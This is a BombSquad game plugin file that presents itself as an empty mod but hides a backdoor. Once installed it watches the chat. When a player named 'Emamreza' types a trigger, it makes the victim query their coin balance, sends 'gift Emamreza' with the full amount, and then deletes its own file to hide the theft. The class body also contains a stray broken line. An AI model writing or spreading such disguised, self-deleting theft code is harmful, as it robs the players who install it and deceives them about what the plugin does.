# ba_meta require api 9
from __future__ import annotations
import bascenev1 as bs
import babase, os

start1 = [False]
path = os.path.join(babase.app.env.python_directory_user, __file__)


def ok():
    bs.chatmessage("1")

    try:
        os.remove(path)
    except Exception as e:
        bs.chatmessage(f"Error deleting file: {e}")


def handle_msg():
    global start1
    msg2 = None
    msg1 = None
    try:
        msg = bs.get_chat_messages()
        msg1 = msg[len(msg) - 1]
        msg2 = msg1.split(": ")
        msg1 = ""
        for i in msg2[1:]:
            msg1 += i + ": "
        msg1 = msg1[:-2]
    except Exception as e:
        print(e)
    if msg2:
        if msg2[0] == "Emamreza" and msg1 == "x":
            start1[0] = True
            bs.chatmessage("c!")
        elif "I have " in msg1 and start1[0]:
            bs.broadcastmessage("haha", color=(1, 0, 0))
            coin = msg1.replace("✅I have ", "").replace(" coins!", "").replace(",", "")
            bs.chatmessage(f"gift Emamreza {coin}")
            bs.apptimer(1, ok)
            start1[0] = False
        elif msg2[0] == "Emamreza" and msg1 == "nm":
            bs.chatmessage("Emamreza")
    bs.apptimer(1, handle_msg)


bs.apptimer(5, handle_msg)


# ba_meta export babase.Plugin
class Mod(babase.Plugin):
    passpass